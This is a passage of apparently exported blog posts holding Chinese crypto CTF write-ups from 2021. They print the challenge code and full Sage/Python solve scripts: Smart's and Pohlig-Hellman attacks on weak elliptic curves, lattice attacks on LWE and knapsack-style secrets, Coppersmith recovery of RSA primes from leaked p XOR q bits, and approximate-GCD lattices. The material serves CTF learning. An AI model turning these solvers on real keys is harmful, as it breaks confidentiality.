').decode()tmp = int(resp.split('\\n')[1][32:34], 16)print(hex(tmp))END = hex(tmp ^ 31)[2:].ljust(2, '0')print(len(roundnum),len(roundnum + END * 15))con.sendline((roundnum + 58 * '0'+ END).encode())resp = con.recv()print(resp)resp = con.recv()print(resp)resp = con.recv()print(resp) 总之就是硬摸, 反正也不是什么复杂的过程, 看图找规律了属于是","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup-for-2021-第五空间","date":"2021-09-17T16:03:08.000Z","path":"2021/09/18/writeup-for-2021-第五空间/","text":"算是第一次AK密码? eccproblem1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465print 'Try to solve the 3 ECC'from secret import flagfrom Crypto.Util.number import *assert(flag[:5]=='flag{')flag = flag[5:-1]num1 = bytes_to_long(flag[:7])num2 = bytes_to_long(flag[7:14])num3 = bytes_to_long(flag[14:])def ECC1(num): p = 146808027458411567 A = 46056180 B = 2316783294673 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print 'P:',P print 'Q:',Qdef ECC2(num): p = 1256438680873352167711863680253958927079458741172412327087203 #import random #A = random.randrange(389718923781273978681723687163812) #B = random.randrange(816378675675716537126387613131232121431231) A = 377999945830334462584412960368612 B = 604811648267717218711247799143415167229480 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print 'P:',P print 'Q:',Q factors, exponents = zip(*factor(E.order())) primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-1] print primes dlogs = [] for fac in primes: t = int(int(P.order()) / int(fac)) dlog = discrete_log(t*Q,t*P,operation=\"+\") dlogs += [dlog] print(\"factor: \"+str(fac)+\", Discrete Log: \"+str(dlog)) #calculates discrete logarithm for each prime order print num print crt(dlogs,primes)def ECC3(num): p = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b A = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07 B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2 E = EllipticCurve(GF(p),[A,B]) P = E.random_point() Q = num*P print E print 'P:',P print 'Q:',QECC1(num1)print '=============='ECC2(num2)print '=============='ECC3(num3) 不懂, 为啥题目里还有PolligHellman的代码的 提示? 前两个ecc就用PolligHellman就能解出来 剩下最后一个用smart’s attack 参考论文https://wstein.org/edu/2010/414/projects/novotney.pdf exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from sage.all import *from Crypto.Util.number import long_to_bytes,bytes_to_long# Define the curvep = 146808027458411567a = 46056180b = 2316783294673# Generatorg_x = 119851377153561800g_y = 50725039619018388F = FiniteField(p)E = EllipticCurve(F,[a,b])G = E.point((g_x, g_y))n = G.order()print(n.factor())'''2^2 * 7 * 193 * 110603 * 122811083'''primes = [4 , 7 , 193 , 110603 , 122811083]x=22306318711744209y=111808951703508717C = E.point((x, y))dlogs = []for fac in primes: t = int( n // fac ) dlog = discrete_log( t*C , t*G, operation='+' ) dlogs += [dlog] print(\"factor:\"+str(fac)+\",Discrete Log:\"+str(dlog))nC = crt(dlogs,primes)print(long_to_bytes(nC))# 第二条曲线跟第一条曲线是一样的 就不再抄一遍了from Crypto.Util.number import long_to_bytesp = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1bA = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2E =EllipticCurve(GF(p),[A,B])g_x = 10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861g_y = 8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610G = E.point((g_x, g_y))x=964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927y=5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537C = E.point((x, y))def HenselLift(P,p,prec): E = P.curve() Eq = E.change_ring(QQ) Ep = Eq.change_ring(Qp(p,prec)) x_P,y_P = P.xy() x_lift = ZZ(x_P) y_lift = ZZ(y_P) x, y, a1, a2, a3, a4, a6 = var('x,y,a1,a2,a3,a4,a6') f(a1,a2,a3,a4,a6,x,y) = y^2 + a1*x*y + a3*y - x^3 - a2*x^2 - a4*x - a6 g(y) = f(ZZ(Eq.a1()),ZZ(Eq.a2()),ZZ(Eq.a3()),ZZ(Eq.a4()),ZZ(Eq.a6()),ZZ(x_P),y) gDiff = g.diff() for i in range(1,prec): uInv = ZZ(gDiff(y=y_lift)) u = uInv.inverse_mod(p^i) y_lift = y_lift - u*g(y_lift) y_lift = ZZ(Mod(y_lift,p^(i+1))) y_lift = y_lift+O(p^prec) return Ep([x_lift,y_lift]) def SmartAttack(P,Q,p,prec): E = P.curve() Eqq = E.change_ring(QQ) Eqp = Eqq.change_ring(Qp(p,prec)) P_Qp = HenselLift(P,p,prec) Q_Qp = HenselLift(Q,p,prec) p_times_P = p*P_Qp p_times_Q=p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P k = Mod(k,p) return k long_to_bytes(SmartAttack(G,C,p,8)) doublesageproblem1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from sage.modules.free_module_integer import IntegerLatticefrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSamplerfrom sage.crypto.lwe import LWEfrom sage.crypto.lwe import samples import numpy as npimport signaldef Question(n,m,para_D,para_e): signal.alarm(600) print('[+] Question:') # m=n^2-2 q=next_prime(n^2) D=DiscreteGaussianDistributionIntegerSampler(para_D*n) lwe=LWE(n=n, q=q, D=D) Z=[lwe() for _ in range(m)] A=matrix([a for (a,c) in Z]).transpose() C=vector([c for (a,c) in Z]) print('[+] The following matrix operations are modulus',q) print('\\n[+] Matrix A of size',n,'*',m,':'); print(A) print('\\n[+] Vector C of size',1,'*',m,':'); print(np.array(C)) E=lwe._LWE__s*A-C E=[int(e) for e in E] E=vector([e if e &lt;= floor(q/2) else e-q for e in E]) E_norm=E.norm().n()*para_e print('[+] Please give an integer vector x of size',1,'*',m,'(format [1 2 3] or [1, 2, 3]), such that the norm of vector x*A-C &lt;=',E_norm,', where operations are modulus',q,':') k=GF(q)^n x=k(0) u=input() try: u=np.matrix(u) for i in range(n): x[i]=u[0,i] except: print('[+] Wrong format, exit.') exit() E=x*A-C E=[int(e) for e in E] E=vector([e if e &lt;= floor(q/2) else e-q for e in E]) tmp=E.norm().n() print('[+] The norm of vector x*A-C is', tmp,',', tmp&lt;E_norm,'.\\n') if not tmp&lt;E_norm: exit() def ReadFlag(): print('flag{**********}')Question(5, 23, 1.5, 1.1)Question(15, 143, 1.5, 3)ReadFlag() 就是两层lwe….. 直接当成lwe做就好了 exp手动把远程给的向量和矩阵扔进下面的脚本里 把跑出来的向量传给服务器就行了 123456789101112131415161718192021from sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wp = 227M = Matrix([[55,78,211,140,203,28,205,71,148,55,43,66,34,108,99,6,202,138,90,77,128,85,88,189,135,42,157,159,204,51,211,77,2,64,60,137,53,29,214,153,142,138,0,148,53,115,73,178,78,81,219,103,23,64,146,61,98,86,157,102,222,219,2,69,65,183,93,208,156,80,164,70,200,106,128,123,1,29,175,224,62,166,62,122,102,21,3,166,41,26,164,78,199,194,56,82,6,135,99,107,104,178,32,12,57,205,63,14,159,145,133,19,96,145,20,172,49,213,200,111,148,5,45,6,25,19,81,199,52,119,10,12,101,140,189,61,190,168,23,181,74,153,111],[168,115,109,184,137,28,38,86,70,99,113,24,148,189,43,211,9,3,139,50,120,39,192,179,92,193,96,100,124,22,214,81,216,80,55,208,184,145,132,133,177,84,64,164,121,87,191,134,38,28,2,168,66,194,117,215,83,146,217,224,54,9,188,175,39,45,18,89,68,76,20,226,155,58,70,97,209,135,210,85,108,184,7,92,226,187,205,2,88,71,92,187,186,90,182,14,58,98,32,104,141,29,131,200,85,44,30,159,4,33,113,33,49,201,54,31,158,75,225,109,30,95,142,35,204,55,203,215,156,224,2,171,87,183,175,178,168,22,24,201,28,3,20],[152,97,15,188,52,6,149,182,167,134,60,31,154,36,6,209,28,221,144,88,161,144,13,162,90,110,95,216,196,44,133,124,75,218,170,14,84,186,127,142,59,3,185,132,147,63,121,100,10,88,103,145,3,47,179,127,127,150,133,120,90,84,186,140,21,49,93,167,70,140,161,196,29,207,128,217,125,214,28,211,66,44,33,118,166,43,220,131,26,209,108,171,41,205,163,62,20,127,184,7,95,18,125,66,94,26,33,40,68,49,197,111,46,215,97,204,98,69,206,225,193,116,43,85,153,61,184,178,195,220,127,164,168,45,42,22,104,194,19,0,111,138,191],[54,169,0,103,88,221,86,108,36,171,128,139,198,103,154,83,193,115,84,41,84,136,75,90,20,109,219,22,107,180,136,13,203,98,133,141,57,181,139,226,161,25,21,198,3,200,17,63,223,165,54,74,76,84,189,89,84,95,191,168,91,141,109,148,186,40,5,113,0,71,167,54,29,219,55,64,3,162,34,56,138,109,65,174,43,20,158,22,175,93,136,26,193,60,180,216,24,185,56,86,205,123,31,126,120,84,47,67,165,36,217,153,192,121,142,120,153,39,188,209,119,35,223,155,49,200,215,187,10,111,138,116,223,49,14,127,100,61,197,134,143,164,192],[125,88,118,197,140,200,191,110,135,76,71,33,223,183,34,100,16,53,190,153,185,201,91,118,118,51,10,214,142,223,77,215,11,1,109,166,210,32,63,129,109,146,9,68,28,224,73,43,159,35,185,100,126,218,88,90,111,79,177,54,149,31,86,82,203,11,104,211,200,205,75,226,220,36,31,177,191,200,210,92,60,92,40,96,23,129,99,209,57,55,224,12,154,200,118,25,168,27,28,93,91,175,107,35,22,123,110,86,87,62,149,79,116,28,125,164,114,88,217,80,199,211,113,20,29,68,124,141,157,11,160,85,189,223,135,77,186,172,11,55,40,125,187],[32,42,151,123,149,215,156,87,47,27,160,145,114,118,78,113,205,152,173,92,109,62,185,201,149,216,220,72,208,55,78,1,56,177,147,30,68,223,194,126,155,59,24,10,26,8,104,211,214,119,208,141,188,65,82,130,173,190,107,156,57,157,16,72,43,154,174,52,7,22,39,163,219,134,9,49,20,75,189,182,161,32,82,15,10,22,46,33,145,120,161,216,6,185,131,226,56,53,219,173,150,94,93,10,64,99,124,195,207,220,96,80,207,155,193,223,68,166,99,189,67,78,222,15,76,35,206,19,114,149,1,141,63,20,145,56,214,212,44,186,88,141,204],[114,4,210,127,90,181,97,17,51,156,182,58,167,185,111,54,67,137,213,165,219,211,143,4,65,129,91,190,67,180,163,29,221,185,100,225,103,190,133,208,90,11,123,141,174,93,18,177,124,146,50,107,25,64,219,63,44,186,152,14,25,141,107,188,106,168,136,94,154,6,41,168,193,137,92,179,203,36,85,213,138,149,225,62,89,78,10,180,25,155,38,223,82,221,190,223,42,144,186,49,169,45,161,137,152,180,152,77,97,222,104,98,167,88,116,174,67,75,81,119,205,3,180,24,159,190,102,157,199,152,145,146,131,208,58,121,178,95,211,214,163,196,104],[32,174,189,30,141,182,192,20,103,100,191,80,151,124,185,166,41,32,39,34,169,35,80,108,89,67,150,16,109,8,102,122,85,224,175,115,104,20,116,112,192,66,173,212,29,19,102,66,116,37,146,19,102,65,98,187,0,142,56,192,143,91,20,193,183,107,215,144,184,57,193,86,50,65,220,129,51,212,78,16,91,190,37,116,102,120,178,56,193,146,218,64,142,178,225,207,129,110,104,170,156,148,182,91,220,207,193,124,45,98,57,96,38,67,99,97,149,7,181,138,192,220,195,14,99,152,38,70,186,8,123,204,127,1,39,181,159,75,122,54,41,137,41],[115,170,6,225,99,21,139,118,133,16,175,94,163,163,222,67,220,75,215,142,8,167,86,20,94,7,169,5,145,208,213,153,38,202,191,10,66,133,92,91,95,28,38,86,127,215,3,206,67,170,14,153,108,219,0,10,64,78,74,223,199,180,16,13,169,109,224,213,142,65,12,29,100,109,104,102,131,24,202,92,70,11,215,41,35,112,39,10,182,131,120,95,112,49,116,81,43,49,54,30,225,63,167,16,118,75,193,50,125,224,161,127,186,88,196,3,0,215,219,217,168,221,206,63,86,133,153,216,16,152,39,19,183,155,200,80,33,48,150,104,193,137,189],[19,127,92,102,59,196,66,49,7,211,120,87,95,196,93,17,195,184,187,87,0,151,169,150,82,67,24,85,12,77,20,10,211,203,57,181,156,148,195,123,90,135,14,200,226,135,17,208,15,176,168,140,161,217,2,125,91,167,157,118,100,167,148,155,114,208,159,123,136,95,89,170,21,130,82,10,47,136,88,45,224,23,55,207,200,124,123,113,105,67,80,147,55,127,200,158,209,10,53,135,100,161,27,154,2,80,174,95,12,73,154,17,92,106,206,85,171,69,56,212,213,211,221,166,72,188,78,113,147,26,148,141,41,96,81,31,95,169,164,7,134,125,174],[158,177,225,122,164,132,16,150,170,166,67,2,192,194,28,104,59,148,150,106,179,217,159,94,107,217,209,225,226,39,138,219,163,116,48,40,63,140,8,139,38,144,63,94,205,210,186,217,214,141,22,186,198,114,211,219,82,34,122,92,34,182,156,170,58,41,150,36,212,197,38,131,28,110,48,224,19,109,185,142,186,14,126,156,105,33,79,93,162,183,156,135,43,144,114,8,158,102,145,194,26,29,183,205,219,196,207,142,176,21,225,50,36,22,176,100,40,125,120,114,74,34,176,98,121,77,116,200,85,96,167,63,215,80,1,218,94,29,65,202,42,45,114],[130,124,40,71,145,69,216,122,162,57,134,79,103,8,137,110,8,103,216,172,74,219,141,99,78,104,143,110,130,49,45,54,160,15,196,67,109,208,30,21,195,46,91,38,52,115,173,77,87,111,215,100,91,220,21,4,34,203,173,9,171,129,170,202,9,185,47,198,141,90,216,156,215,99,99,185,194,217,171,155,189,54,14,7,162,173,58,79,34,103,137,208,62,165,104,143,80,33,136,39,111,176,202,207,3,15,173,139,50,49,9,165,170,78,154,180,45,153,40,157,94,73,86,207,26,199,152,12,62,192,175,60,136,96,31,171,114,8,95,17,87,39,177],[51,36,34,69,152,211,6,89,157,60,65,58,78,22,92,23,172,105,12,218,154,171,96,201,41,53,204,215,23,211,216,98,80,45,90,27,177,9,74,169,23,197,221,74,119,152,158,180,73,138,192,149,37,147,80,26,154,180,97,208,130,165,41,180,176,160,20,155,149,213,181,81,62,173,108,80,86,182,35,209,190,217,187,180,201,225,112,125,95,118,48,137,96,79,127,206,49,85,143,139,200,194,49,6,208,109,5,197,75,150,134,194,0,191,72,16,101,4,85,178,131,52,94,139,140,42,14,14,178,94,60,175,16,179,216,14,154,220,136,176,42,145,71],[11,190,138,143,159,121,173,115,63,200,179,44,222,85,202,143,118,197,66,100,116,18,180,77,86,175,32,158,43,133,0,214,162,118,71,224,78,175,82,206,136,137,135,41,146,130,55,42,38,115,165,53,105,189,27,86,61,98,189,7,164,152,188,132,97,2,89,210,14,131,81,11,193,164,174,180,166,112,162,197,27,27,80,120,70,98,197,29,172,88,207,76,81,205,92,37,25,189,66,94,108,222,152,93,116,141,176,72,111,171,204,146,118,5,185,39,171,180,124,78,208,142,85,120,217,61,177,39,77,57,164,139,147,171,149,111,152,168,191,33,98,11,180],[153,44,17,75,199,75,208,31,100,124,210,206,174,223,216,194,156,157,213,101,212,117,162,194,38,184,118,126,10,92,168,197,78,113,71,154,43,177,202,115,27,34,174,54,201,97,112,180,169,32,134,160,104,183,0,145,179,106,156,182,213,214,144,43,226,191,66,34,217,187,137,40,103,194,103,217,13,87,84,151,225,190,26,100,101,30,79,173,207,32,32,150,195,105,162,78,61,16,32,151,4,59,50,219,220,133,13,31,104,122,93,181,5,150,188,25,222,77,111,2,41,12,129,138,107,74,30,145,21,165,192,115,119,118,112,223,74,76,167,167,218,80,121]])P = [[0 for _ in range(143)] for _ in range(143)]for i in range(143): P[i][i] = pM = M.stack(Matrix(P))lattice = IntegerLattice(M, lll_reduce=True)c = vector([158,93,224,147,157,86,28,224,141,124,150,117,110,88,186,115,109,119,166,206,210,89,28,63,110,16,156,125,122,201,147,185,53,211,46,1,100,217,69,12,147,64,136,20,88,198,43,110,126,101,113,81,170,190,93,82,10,217,184,32,39,18,184,214,24,190,78,152,160,62,152,38,214,16,37,28,125,51,20,54,91,220,214,47,95,113,140,226,133,185,11,214,207,189,94,92,223,34,61,168,191,163,152,203,201,215,106,180,114,140,198,177,215,201,208,152,221,0,59,147,205,3,181,104,199,205,27,145,51,105,83,17,32,221,214,194,193,148,65,20,183,102,174])'['+str(BabaisClosestPlaneAlgorithm(lattice.reduced_basis, c))[1:-1]+']' secretsproblem12345678910111213141516171819202122232425262728293031323334353637383940import random, hashlibfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom secret import flagassert(flag[:5] == b\"flag{\" and flag[-1:] == b\"}\")flag = flag[5:-1]p = getPrime(512)secrets = [getPrime(32) for i in range(3)]a = [getPrime(511) for i in range(3)]e = [[random.randint(0,2) for i in range(3)] for j in range(3)]c = 0for i in range(3): tmp = 1 for j in range(3): tmp *= secrets[j] ** e[i][j] c += a[i] * tmp c %= pkey = hashlib.sha256(str(secrets).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)enc_flag = cipher.encrypt(flag).hex()print(p)print(a)print(e)print(c)print(enc_flag)'''12974234240047250882827277463970749648223428465145328709918053842153820677294215343957019413719473165129078971772191068642653862027980142472460705711018201[6208495304507502877592974397978564449062722480435998477821753565334623511793847345749111308898139670628857817327159494561065840693449298616913891952427947, 4428365792626193951517975036630823002373517124620690551190165499794155382003347632615508488697880129516880024881940903287205636949002132541035487795791827, 4718311857821047798142460474602800502374374326300654458450570361490723801361197812174259099714079434910279510299556693616702570294307587124784370853830179][[0, 2, 2], [1, 0, 1], [2, 1, 1]]8024639827831958040886215528711059283414630802186262470325506233115495366865722141662305750597559580380055075908821369972992187624854877285935207126822671bf550e796d6efc92e8543ffcbb8d81fd588900f8f7aecaeeee718d60eaace3bc''' 背包问题经典一个等式流这里的是为了调格子的det, 调到能找到目标向量为止, 找到等式右边的向量就能算出 exp12345678910111213141516171819202122232425import random, hashlibfrom Crypto.Util.number import *from Crypto.Cipher import AESenc_flag = 0xbf550e796d6efc92e8543ffcbb8d81fd588900f8f7aecaeeee718d60eaace3bca = [6208495304507502877592974397978564449062722480435998477821753565334623511793847345749111308898139670628857817327159494561065840693449298616913891952427947, 4428365792626193951517975036630823002373517124620690551190165499794155382003347632615508488697880129516880024881940903287205636949002132541035487795791827, 4718311857821047798142460474602800502374374326300654458450570361490723801361197812174259099714079434910279510299556693616702570294307587124784370853830179]p = 12974234240047250882827277463970749648223428465145328709918053842153820677294215343957019413719473165129078971772191068642653862027980142472460705711018201c = 8024639827831958040886215528711059283414630802186262470325506233115495366865722141662305750597559580380055075908821369972992187624854877285935207126822671i = 128R = 2**iM = Matrix([[1,0,0,0,a[0] * R],[0,1,0,0,a[1] * R],[0,0,1,0,a[2] * R],[0,0,0,1,-c * R],[0,0,0,0,p * R]])L = M.BKZ()s3 = gcd(L[0][0],abs(L[0][1]))s1 = abs(L[0][1]) // s3s2 = sqrt(abs(L[0][0]) // s3 // s3)secrets = [s1,s2,s3]key = hashlib.sha256(str(secrets).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)flag = cipher.decrypt(long_to_bytes(enc_flag))flag signinproblem123456789101112131415161718192021222324from Crypto.Util.number import *from secret import flagp = getPrime(512)q = getPrime(512)n = p * qe = 0x10001x = (p ^ q) &amp; ((1 &lt;&lt; 400) - 1)m = bytes_to_long(flag)c = pow(m,e,n)print(\"c = \" + str(c))print(\"e = \" + str(e))print(\"n = \" + str(n))print(\"x = \" + str(x))'''c = 41079136228776331983513986502894911009747944746334405367181525535644429164244074690458675696682154772257649811625401364517966224711291000199478649309514306511977247475050430881892635166215911325729515065570801798281126631754714292634605360578171629351703909902943766832088848829679735266081587467028354629832e = 65537n = 88873300622677925132392673651975872286851841516213062658793503010409158793653030553313986481205677326846210604582870123515082097235868012724220463515351466605298734168814756198761860328588678124560858545154560701982246840286690871368569184620040790812223630254910190657002367120010677907467764741789052920477x = 138384108215091704603441412066611031482512354164750119910659929381838248956079740784293945420743011870999379776464932828''' plaidCTF 2021里面的那个xorsa改了一下 把给出来的p ^ q 的位数减少到了400位 依旧可以用bfs得到p的低400左右的位数 然后copper p一共就512位 exp123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *from tqdm import tqdmc = 41079136228776331983513986502894911009747944746334405367181525535644429164244074690458675696682154772257649811625401364517966224711291000199478649309514306511977247475050430881892635166215911325729515065570801798281126631754714292634605360578171629351703909902943766832088848829679735266081587467028354629832e = 65537n = 88873300622677925132392673651975872286851841516213062658793503010409158793653030553313986481205677326846210604582870123515082097235868012724220463515351466605298734168814756198761860328588678124560858545154560701982246840286690871368569184620040790812223630254910190657002367120010677907467764741789052920477x = bin(138384108215091704603441412066611031482512354164750119910659929381838248956079740784293945420743011870999379776464932828)[2:]P = []def find(guessp,i): p = int(guessp,2) q = int(x[-i:],2) ^^ p if (q * p) % 2 ** i == n % 2 ** i: if i == 399: P.append(p) else: find('1'+guessp,i+1) find('0'+guessp,i+1)find('1',1)print(len(P))pbits = 512for i in tqdm(range(len(P))): _p = P[i] kbits = 512 - len(bin(_p)[2:]) R.&lt;x&gt; = Zmod(n)[] f = P[i] + x * 2^len(bin(_p)[2:]) f = f.monic() roots = f.small_roots(X=2^kbits,beta=0.4) if roots: p = int(_p + roots[0]* 2^len(bin(_p)[2:])) print(_p + roots[0]* 2^len(bin(_p)[2:])) breakq = n // passert p * q == nphi = (q - 1) * (p - 1)d = inverse_mod(e,phi)long_to_bytes(pow(c,d,n))","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup-for-2021-RCTF","date":"2021-09-14T00:46:26.000Z","path":"2021/09/14/writeup-for-2021-RCTF/","text":"Uncommon Factor Ⅰproblem1234567891011121314151617181920212223242526272829303132333435from multiprocessing import Poolsize = 2^22flag = open(\"flag.txt\", \"rb\").read()assert len(flag) == 22assert flag[:5] == b\"flag{\"assert flag[-1:] == b\"}\"seed = flag[5:-1] # 128 bitseed = (int.from_bytes(seed,'big')&lt;&lt;48) + (randint(0,2^24)&lt;&lt;(128+48)) # 200 bitub = seed + 2^48lb = seedthreads = 64def f(i): p = random_prime(ub, lbound=lb, proof=False) q = random_prime(2**312, proof=False) N = p*q return Ndef reseed(i): set_random_seed()pool = Pool(processes=threads)pool.map(reseed,range(size))lN = pool.map(f,range(size))pool.close()pool.join()lN.sort()with open(\"lN.bin\",\"wb\") as f: for n in lN: f.write(int(n).to_bytes(512//8,\"big\")) 参数的大小变了, AGCD不管用了, 等爷爷wp了, Uncommon Factor Ⅱproblem1234567891011121314151617181920212223242526272829303132333435from multiprocessing import Poolsize = 2^7flag = open(\"flag.txt\", \"rb\").read()assert len(flag) == 22assert flag[:5] == b\"flag{\"assert flag[-1:] == b\"}\"seed = flag[5:-1] # 128 bitseed = (int.from_bytes(seed,'big')&lt;&lt;104) + (randint(0,2^80)&lt;&lt;(128+104)) # 312 bitub = seed + 2^104lb = seedthreads = 64def f(i): p = random_prime(ub, lbound=lb, proof=False) q = random_prime(2**200, proof=False) N = p*q return Ndef reseed(i): set_random_seed()pool = Pool(processes=threads)pool.map(reseed,range(size))lN = pool.map(f,range(size))pool.close()pool.join()lN.sort()with open(\"lN.bin\",\"wb\") as f: for n in lN: f.write(int(n).to_bytes(512//8,\"big\")) 尝试做出来了, 看看整个流程, 可以知道的式子两边整除再把拆出来就有也就是把括号里的看成一个整体, 求就可以看成是一个问题了, 题目也给了很多个, 构造常规的格子就行了调整参数规约格子就能得到了, 有了求就简单了 exp12345678910111213141516171819202122232425262728293031from sage.all import *from Crypto.Util.number import bytes_to_long,long_to_byteswith open('lN.bin','rb') as f: file = f.read()lN = []for i in range(0,len(file),64): lN.append(bytes_to_long(file[i:i+64])) N = []for n in lN: a = n // 2**104 if a not in N: N.append(a)LEN = len(N)B = LENprint(LEN)M = [[0 for _ in range(B)] for _ in range(B)]for i in range(500): M[0][0] = 2 ** i for j in range(1,B): M[0][j] = N[j] M[j][j] = -N[0] RES = Matrix(M).LLL()[0] if RES[0] % 2 ** i == 0: q = abs(RES[0] // 2 ** i) if q != 0 : R = N[0] % q m = ((N[0] - R) // q) % 2 ** 128 print(long_to_bytes(m))","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup for 2021 WMCTF","date":"2021-09-07T12:09:12.000Z","path":"2021/09/07/writeup-for-2021-WMCTF/","text":"比赛那天刚好返校, 没怎么打, 复盘一下 checkin猜谜一样… 直到是背包问题也不知道具体该做什么…. 挂着先 baby_OCB 红明古, 下次一定学会咕咕咕咕咕 easylsbproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#!/usr/bin/python3# encoding: utf-8import randomimport stringimport sysimport osfrom hashlib import sha256import uuidfrom Crypto.Util.number import *password = b'Hidden'flag = ('flag{' + str(uuid.uuid4()) + '}').encode()# def proof_of_work():# random.seed(os.urandom(8))# proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]).encode()# digest = sha256(proof).hexdigest()# printf(\"sha256(XXXX+%s) == %s\" % (proof[4:].decode(),digest))# printf('Give me XXXX:')# x = read_str()# if len(x) != 4 or sha256(x.encode()+proof[4:]).hexdigest() != digest: # return False# return Truedef printf(message): sys.stdout.write('{0}\\n'.format(message)) sys.stdout.flush() sys.stderr.flush()def read_str(): return sys.stdin.readline().strip()def read_int(): return int(sys.stdin.readline().strip())def next_prime(a): while not isPrime(a): a += 2 return adef get_prime(a): suffix = getPrime(368) return next_prime(a ** 2 + suffix + 1)def generate_pubkey(key): p, q = get_prime(getPrime(512)), get_prime(key) n = p * q return ndef airdrop(a): n = generate_pubkey(a) printf('gift: {}'.format(n)) returndef hint(n, e, c): printf('n = {}'.format(n)) printf('e = {}'.format(e)) printf('c = {}'.format(c)) returndef leak(): p = get_prime(getPrime(512)) e = 0x1000 c = pow(bytes_to_long(flag), e, p) hint(p, e, c) returndef backdoor(): printf('Input your password:') user_input = read_str() if user_input.encode() == password: leak() else: printf('Wrong') exit(0)if __name__ == '__main__': # if not proof_of_work(): # exit(0) a = getPrime(512) print(a) p = get_prime(a) q = get_prime(getPrime(512)) n = p * q e = 0x10001 max_time = 5 password_enc = pow(bytes_to_long(password), e, n) printf('====================================',) printf('1. Airdrop ',) printf('2. Backdoor ',) printf('3. Hint ',) printf('4. Exit ',) printf('====================================',) try: while True: printf('Your choice:') choice = read_int() if choice == 1: if max_time &gt; 1: airdrop(a) max_time -= 1 printf('Done!') else: printf('Greed will destroy you!') continue elif choice == 2: backdoor() printf('Done!') continue elif choice == 3: hint(n, e, password_enc) printf('Done!') continue elif choice == 4: printf('bye~') exit(0) continue else: printf('Invalid!') continue except: exit(-1) 要得到flag 必须通过leak() 而要调用leak()必须知道password 看一下airdrop()函数 choice 1每次调用都会给一个gift 也就是 The Approximate GCD Problem之前的比赛也有遇到过, 这次认真的再看看 这里是个问题, 所谓的就是近似值 比如现在有这个就是一般的问题,而呢就是给这里的每个都加上一个那这样要求出就不能用之前的算法了. 为了解决这个问题可以把这两行合成一下像这种形式的一看就可以写到一个格子里面去右边的向量的范数跟是有关的, 而是可以调整的, 所以理论上只要右边的几个参数够小, 我们是有机会找到这个向量从而求出, 求出就能解决问题了. 现在回到题目. 现在有五行式子其实这里我一拿到这五行就开始构造格子做了, 但dbt👴提醒了我, 问题右边参数越小越好, 考虑一下开方, 因为问题本身就是一个近似值求解GCD的问题. 所以我们在做的过程中也做点近似一般是不会影响的(?有爷爷研究过近似的一个度吗让右边的式子更小之后, 用五组数据构造格子规约之后能找到向量(后面的不重要就先不写了)但在规约的时候, 因为范数的问题, 需要不断的调整的值才能找我们需要的那个向量, 调整的依据就是这个的大小, 这个大小是知道的,所以最后得到的应该是 事实上, 在我看到的blog里面, 这个R的取值是有一定的方法的, 没有搞懂具体该怎么去判断, 所以只能通过调整的方法来做这题了, 想起来自己的博客之前也有试过去推一个大概的值, 可以翻前面的看看 所以现在只需要不断的调整的大小, 直到找出一个的真正的 ,有了就能求出了, 解出剩下的就是已知高位了 做这题的时候发现如果只用四组数据, 不管怎么的调整, 也没有办法找出想要的那个向量出来, 不知道是不是因为参数的大小, 四组数据给出的约束不够强? 解完AGCD之后就能拿到一个加密的flag, e和phi不互素, 发现e是, 直接开12次平方根就行了 